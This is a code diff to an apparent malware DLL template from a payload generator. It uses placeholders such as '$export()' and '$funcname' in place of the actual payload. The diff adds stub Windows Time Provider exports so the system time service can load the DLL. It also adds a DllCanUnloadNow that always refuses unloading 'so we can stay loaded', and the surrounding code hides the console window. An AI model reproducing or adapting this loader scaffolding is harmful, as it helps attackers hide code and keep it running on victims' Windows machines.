@@ -56,6 +56,7 @@
 
 #include <winsock.h>
 #include <windows.h>
+#include <timeprov.h>
 
 #include "bolt.h"
 
@@ -71,6 +72,10 @@ EXPORT HRESULT WINAPI VoidFunc() {
         ShowWindow(c, 0);
     }
     $export();
+}
+EXPORT HRESULT WINAPI DllCanUnloadNow() {
+    // Always return S_FALSE so we can stay loaded.
+    return 1;
 }
 EXPORT HRESULT WINAPI DllRegisterServer() {
     HANDLE c = GetConsoleWindow();
@@ -93,8 +98,21 @@ EXPORT HRESULT WINAPI DllInstall(BOOL b, PCWSTR i) {
     }
     $export();
 }
+EXPORT HRESULT WINAPI TimeProvClose(TimeProvHandle p) {
+    return 0;
+}
+EXPORT HRESULT WINAPI RegisterModule(DWORD v, void* m, void* g) {
+    return 0;
+}
+EXPORT HRESULT WINAPI TimeProvCommand(TimeProvHandle h, TimeProvCmd c, PVOID a) {
+    return 0;
+}
+EXPORT HRESULT WINAPI TimeProvOpen(WCHAR *n, TimeProvSysCallbacks *c, TimeProvHandle *p) {
+    *p = (TimeProvHandle)1;
+    return 0;
+}
 
-EXPORT void $funcname(HWND h, HINSTANCE i, LPSTR a, int s) {
+EXPORT VOID WINAPI $funcname(HWND h, HINSTANCE i, LPSTR a, int s) {
     HANDLE c = GetConsoleWindow();
     if (c != NULL) {
         ShowWindow(c, 0);
